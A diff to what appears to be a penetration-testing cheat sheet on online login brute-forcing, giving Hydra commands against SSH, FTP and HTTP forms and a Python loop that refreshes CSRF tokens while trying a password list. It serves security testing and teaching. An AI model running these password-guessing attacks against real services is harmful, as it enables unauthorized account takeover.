@@ -1,22 +1,27 @@
 # Online login checks
 
-[← Passwords quick reference](../07-password-attacks.md)
-
-Check lockout/account scope; capture one known failure including redirect.
+Check lockout and account scope first; capture one known failure (including redirect).
 
 ```bash
-hydra -l <user> -P candidates.txt <target-ip> ssh -t 4
-hydra -l <user> -P candidates.txt <target-ip> ftp -t 4
-hydra -l <user> -P candidates.txt <target-ip> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
+hydra -l <USER> -P candidates.txt <IP> ssh -t 4
+hydra -l <USER> -P candidates.txt <IP> ftp -t 4
+hydra -l <USER> -P candidates.txt <IP> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
 ```
+```bash
+hydra -U http-post-form
+```
+- `hydra -U <MODULE>` shows the module's option syntax. Set the real path, field names and failure text.
+- Baseline one success and one failure first; refresh per-request CSRF token/session (below).
+- Every attempt "succeeds" → recheck the failure string, token and redirect.
 
-Set actual path, fields, failure text. Per-request CSRF needs fresh page + session; example expects `csrf` and `/dashboard`.
+## Per-request CSRF token
+Hydra can't refresh a token per attempt: script it (expects a `csrf` field and a `/dashboard` redirect on success).
 
 ```python
 import re
 import requests
 
-url = "http://TARGET/login"
+url = "http://<IP>/login"
 for password in open("candidates.txt", encoding="utf-8"):
     with requests.Session() as session:
         page = session.get(url)
@@ -32,5 +37,3 @@ for password in open("candidates.txt", encoding="utf-8"):
             print("Found:", password.strip())
             break
 ```
-
-Every attempt succeeds? Recheck known failure, token, and redirect.
